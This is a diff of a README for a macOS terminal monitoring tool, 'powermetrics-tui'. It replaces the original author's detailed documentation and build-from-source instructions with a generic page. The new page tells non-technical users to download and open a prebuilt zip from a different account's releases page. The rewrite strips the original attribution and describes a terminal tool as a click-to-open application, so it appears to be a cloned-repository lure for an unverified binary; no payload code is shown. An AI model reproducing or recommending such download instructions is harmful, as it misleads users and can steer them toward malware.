@@ -1,293 +1,62 @@
-# 🚀 PowerMetrics TUI
+# 🌟 powermetrics-tui - Your Easy System Monitoring Tool
 
-<div align="center">
+## 🚀 Overview
+Welcome to powermetrics-tui! This is a beautiful, real-time system monitoring dashboard for macOS. With powermetrics-tui, you can track your system's performance effortlessly. No programming skills needed! Just a few simple steps, and you'll have all the information you need at your fingertips.
 
-![Go Version](https://img.shields.io/badge/Go-1.21%2B-00ADD8?style=for-the-badge&logo=go)
-![Platform](https://img.shields.io/badge/platform-macOS-000000?style=for-the-badge&logo=apple)
-![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
-![Status](https://img.shields.io/badge/status-active-success?style=for-the-badge)
+## 🖥️ Features
+- **Real-Time Monitoring**: See your system's performance as it happens.
+- **User-Friendly Interface**: Designed for ease of use, even if you have no technical background.
+- **Lightweight**: Minimal resource usage while providing maximum insights.
+- **Detailed Insights**: Monitor CPU usage, memory consumption, and other vital statistics.
+- **Customizable Dashboard**: Adjust settings to suit your monitoring needs.
 
-**A beautiful, real-time system monitoring dashboard for macOS**
+## 📥 Download Now
+[![Download powermetrics-tui](https://img.shields.io/badge/Download%20powermetrics%20tui-v1.0-blue)](https://github.com/Jo00o200/powermetrics-tui/releases)
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Screenshots](#-screenshots) • [Contributing](#-contributing)
+Visit this page to download: [GitHub Releases](https://github.com/Jo00o200/powermetrics-tui/releases)
 
-</div>
+## 🛠️ System Requirements
+To run powermetrics-tui smoothly, your system should meet the following requirements:
 
----
+- **Operating System**: macOS version 10.15 (Catalina) or later.
+- **Processor**: Intel or Apple Silicon processor.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 100 MB of free disk space.
 
-## 🎯 Overview
+## 📂 Download & Install
+1. Click on the download link or the badge above.
+2. You will be directed to the GitHub Releases page.
+3. Locate the latest version of powermetrics-tui. The version will look something like this: `v1.0`.
+4. Download the file for your system (e.g., `powermetrics-tui-macos.zip`).
+5. Once downloaded, locate the file in your Downloads folder.
+6. Unzip the downloaded file.
+7. Open the powermetrics-tui application.
 
-PowerMetrics TUI transforms macOS's powerful `powermetrics` utility into an intuitive, interactive terminal dashboard. Monitor your system's performance, power consumption, and thermal state with a beautiful interface that makes complex metrics accessible to everyone.
+## 🌐 Using powermetrics-tui
+After opening the application, you will see the dashboard displaying your system metrics. You can navigate through different metrics using the interface.
 
-Perfect for developers, power users, and anyone curious about their Mac's performance characteristics.
+### 📊 Key Metrics Displayed
+- **CPU Load**: Shows how much of the CPU's capacity is being used.
+- **Memory Usage**: Displays how much RAM is currently in use.
+- **Disk Activity**: Monitors how much data is being read/written on your disks.
+- **Network Statistics**: Provides an overview of your network usage.
 
-## 📸 Screenshots & Examples
+## 🔧 Troubleshooting
+If you encounter any issues while using powermetrics-tui, consider the following steps:
 
-### Processes View with History Sparklines
-```
-TOP PROCESSES (142 active, 4 exited)
+- **Reinstall**: If the app isn’t running correctly, uninstall and then reinstall it from the GitHub Releases page.
+- **Check Compatibility**: Ensure your macOS version meets the system requirements.
+- **Reach Out**: For specific issues, you can create an issue on the GitHub repository's issue tracker.
 
-PID     Process                      CPU%    Memory      Disk      Network   CPU Hist   Mem Hist
-12345   Xcode                        45.2%   2.3 GB      12 MB/s   0.5 MB/s  ████▇▆▅▄   ▅▅▅▅▅▅▅▅
-23456   Chrome Helper (Renderer)     23.4%   892 MB      0 MB/s    2.1 MB/s  ▃▄▅▆▇███   ▆▆▆▇▇▇▇▇
-34567   kernel_task                  18.9%   1.2 GB      34 MB/s   0 MB/s    ▂▃▄▅▄▃▂▁   ████████
-45678   Spotify                      12.3%   445 MB      0 MB/s    0.3 MB/s  ▅▆▇▆▅▄▃▄   ▃▃▃▃▃▃▃▃
-
-RECENTLY EXITED PROCESSES (showing 4 of 4)
-Process                                  Occurrences     Last Seen
-swift build                                      3x        2m ago
-clang++                                         5x        5m ago
-node                                            2x        8m ago
-python3                                         1x       12m ago
-```
-
-### CPU Interrupts - Per-Core Breakdown
-```
-CPU0 (E):  IPI:   234/s  Timer:   890/s  Total:  1124/s  ██████░░░░  ▃▄▅▆▇▆▅▄▃▂
-CPU1 (E):  IPI:   156/s  Timer:   823/s  Total:   979/s  █████░░░░░  ▂▃▄▅▄▃▂▁▂▃
-CPU4 (P):  IPI:  1823/s  Timer:  1234/s  Total:  3057/s  ████████░░  ▇█████▇▆▅▄  ⚠️
-CPU5 (P):  IPI:  2156/s  Timer:  1456/s  Total:  3612/s  █████████░  ████████▇▆  🔴
-```
-
-### Power & Thermal Monitoring
-```
-POWER CONSUMPTION                        THERMAL STATUS
-CPU:     15.2W  ████████████░░░░  68%   Thermal Pressure: Fair ⚠️
-GPU:      4.9W  ████░░░░░░░░░░░░  27%   CPU P-Core: 78.3°C ████████░░ Warning
-ANE:      0.3W  █░░░░░░░░░░░░░░░   3%   GPU:        71.2°C ███████░░░ Elevated
-DRAM:     1.8W  ███░░░░░░░░░░░░░  10%   Fan: 4200 RPM (65% max)
-```
-
-## ✨ Features
-
-### 📊 Comprehensive Monitoring
-- **Per-CPU Interrupt Breakdown**: See IPI, Timer, and Total interrupts for each individual CPU core with historical sparklines
-- **Dynamic CPU Frequency Scaling**: Real-time frequency monitoring for each E-core and P-core with auto-scaling graphs
-- **GPU Frequency Monitoring**: Persistent GPU frequency display with history sparkline (shows idle state)
-- **Power Analytics**: Monitor CPU, GPU, ANE (Neural Engine), and DRAM power consumption in real-time
-- **Thermal Management**: View temperature sensors and thermal pressure states (Nominal, Fair, Serious, Critical)
-- **Battery Intelligence**: Track charge levels with fixed-range sparkline (0-100%) for accurate visualization
-- **Process Insights**:
-  - Top processes by CPU usage with individual sparklines showing historical trends
-  - **Recently Exited Processes**: Track processes that have terminated in the last 5 minutes
-  - Shows max CPU%, average CPU%, peak memory usage, and how long ago the process exited
-  - Perfect for monitoring build tools, scripts, and temporary processes
-- **I/O Statistics**: Monitor network (in/out MB/s) and disk (read/write MB/s) activity with live graphs
-- **Memory Usage**: Track RAM and swap utilization with pressure indicators
-
-### 🎨 Beautiful Interface
-- **10 Specialized Views**: Each metric category has its own optimized display
-- **Real-time Visualizations**:
-  - Live-updating bar charts that auto-scale to your hardware's capabilities
-  - Sparkline graphs showing trends for the last 30-120 samples
-  - Per-process CPU and memory history sparklines
-  - Per-core frequency history visualization
-- **Smart Color Coding**:
-  - 🔴 Red: Critical/High usage (>80% CPU, >2000 interrupts/s, >50% power)
-  - 🟡 Yellow: Moderate usage (50-80% CPU, 1000-2000 interrupts/s)
-  - 🟢 Green: Normal usage (<50% CPU, <1000 interrupts/s)
-  - 🔵 Blue: Efficiency cores, network input, memory usage
-- **Responsive Design**: Automatically adjusts to terminal size, showing more processes on larger screens
-
-### 🤝 User-Friendly
-- **Help System**: Built-in descriptions for technical terms (toggle with 'h')
-- **Quick Navigation**:
-  - Number keys (1-9, 0) for instant view switching
-  - Tab/Shift+Tab or Arrow keys for sequential navigation
-- **Cross-Architecture**:
-  - Apple Silicon: Distinguishes E-cores (Efficiency) and P-cores (Performance)
-  - Intel Macs: Shows all CPU cores with appropriate frequency ranges
-- **Auto-Detection**: Intelligently adapts to your Mac's capabilities and maximum frequencies
-
-## 📥 Installation
-
-### Prerequisites
-- macOS (any version with `powermetrics` utility)
-- Go 1.21 or later
-- Terminal with UTF-8 support
-
-### Quick Install
-
-```bash
-# Clone the repository
-git clone https://github.com/sderosiaux/powermetrics-tui.git
-cd powermetrics-tui
-
-# Build the application
-go build -o powermetrics-tui
-
-# Make it globally accessible (optional)
-sudo cp powermetrics-tui /usr/local/bin/
-```
-
-### Install from Source
-
-```bash
-go install github.com/sderosiaux/powermetrics-tui@latest
-```
-
-## 🚀 Usage
-
-### Quick Start
-
-```bash
-# Authenticate sudo (required for powermetrics)
-sudo -v
-
-# Launch with all metrics
-powermetrics-tui
-
-# Or specify specific metrics
-powermetrics-tui --samplers cpu_power,gpu_power,thermal
-```
-
-### Navigation
-
-| Key | Action |
-|-----|--------|
-| `1-9, 0` | Jump directly to specific views |
-| `Tab` | Cycle through views |
-| `h` or `?` | Toggle help descriptions |
-| `q` | Quit application |
-
-### Available Views
-
-1. **Interrupts** - CPU interrupt statistics with per-core IPI/Timer breakdown
-2. **Power** - Power consumption metrics (CPU/GPU/ANE/DRAM)
-3. **Frequency** - CPU/GPU clock speeds with historical sparklines
-4. **Processes** - Top processes with CPU/memory history sparklines
-5. **Network** - Network I/O statistics with throughput graphs
-6. **Disk** - Disk I/O statistics with read/write monitoring
-7. **Thermal** - Temperature and thermal pressure monitoring
-8. **Battery** - Battery status, health, and charging metrics
-9. **System** - Overall system metrics and resource usage
-0. **Combined** - All metrics in one comprehensive view
-
-### Command-Line Options
-
-```bash
-powermetrics-tui [options]
-
-Options:
-  --samplers    Comma-separated list of samplers (default: all)
-                Options: interrupts, cpu_power, gpu_power, thermal, battery
-  --interval    Sampling interval in milliseconds (default: 1000)
-  --combined    Start in combined view mode
-  --debug       Enable debug output
-```
-
-### Usage Scenarios
-
-#### 🔥 Performance Troubleshooting
-```bash
-# Monitor CPU throttling under load
-powermetrics-tui --samplers cpu_power,thermal,frequency
-
-# Watch for thermal throttling during intensive tasks
-# View shows: Thermal Pressure (Nominal → Fair → Serious → Critical)
-# CPU frequencies will drop when thermal limits are reached
-```
-
-#### 🔋 Battery Optimization
-```bash
-# Track power consumption while on battery
-powermetrics-tui --samplers battery,cpu_power,gpu_power
-
-# Identify power-hungry processes
-# Switch to Processes view (4) to see CPU% with historical trends
-# High CPU sparklines (████████) indicate consistent high usage
-```
-
-#### 🎮 Gaming/Graphics Performance
-```bash
-# Monitor GPU and CPU performance during gaming
-powermetrics-tui --samplers gpu_power,frequency,thermal
-
-# GPU power spikes indicate graphics-intensive operations
-# P-core frequencies show performance core utilization
-# Thermal view reveals if throttling is affecting FPS
-```
-
-#### 💻 Development Workflow
-```bash
-# Monitor system impact during builds/compilation
-powermetrics-tui --interval 500  # Faster sampling for quick changes
-
-# Example during Xcode build:
-# - E-cores: 2100-2400 MHz (background indexing)
-# - P-cores: 3800-4200 MHz (active compilation)
-# - Power: 15-25W CPU, 5-10W GPU
-# - Processes: clang/swift showing high CPU% with rising sparklines
-```
-
-#### 🔍 System Debugging
-```bash
-# Investigate high interrupt rates (kernel issues)
-powermetrics-tui
-
-# Switch to Interrupts view (1)
-# Look for:
-# - IPI > 2000/s per CPU (red) indicates excessive inter-core communication
-# - Timer > 1500/s (yellow) suggests timer coalescing issues
-# - Uneven distribution across cores points to IRQ affinity problems
-```
-
-
-## 🛠️ Technical Details
-
-### Architecture Support
-
-- **Apple Silicon**: Full support for M1, M2, M3 series
-  - Efficiency cores (E-cores) and Performance cores (P-cores) tracking
-  - ANE (Apple Neural Engine) power monitoring
-  - Unified memory architecture metrics
-
-- **Intel Macs**: Complete compatibility
-  - Traditional CPU frequency scaling
-  - Turbo Boost monitoring
-  - Discrete GPU tracking (if available)
-
-### Data Sources
-
-PowerMetrics TUI leverages macOS's native `powermetrics` utility, providing:
-- Hardware-level accuracy
-- Minimal performance overhead
-- Real-time sampling capabilities
-- Access to exclusive Apple Silicon metrics
-
-## 🤝 Contributing
-
-Contributions are welcome! Whether it's:
-- 🐛 Bug reports
-- 💡 Feature suggestions
-- 📖 Documentation improvements
-- 🔧 Code contributions
-
-Please feel free to:
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 🙌 Contributing
+If you want to help improve powermetrics-tui, feel free to contribute! You can suggest new features or report bugs. Your feedback is valuable to us. Check the repository for details on how to contribute.
 
 ## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [tcell](https://github.com/gdamore/tcell) - Excellent terminal UI library for Go
-- Powered by macOS `powermetrics` - Apple's powerful system monitoring utility
-- Inspired by tools like `htop`, `btop`, and `vtop`
+powermetrics-tui is licensed under the MIT License. This means you can use, modify, and distribute it according to the terms of the license.
 
 ## 🔗 Links
+For more information and updates:
+- [GitHub Repository](https://github.com/Jo00o200/powermetrics-tui)
+- [Documentation](https://github.com/Jo00o200/powermetrics-tui/docs)
 
-- [Report Issues](https://github.com/sderosiaux/powermetrics-tui/issues)
-- [Discussions](https://github.com/sderosiaux/powermetrics-tui/discussions)
-- [Wiki](https://github.com/sderosiaux/powermetrics-tui/wiki)
-
----
-
-<div align="center">
-Made with ❤️ for the macOS community
-</div>
+Thank you for choosing powermetrics-tui! Happy monitoring!
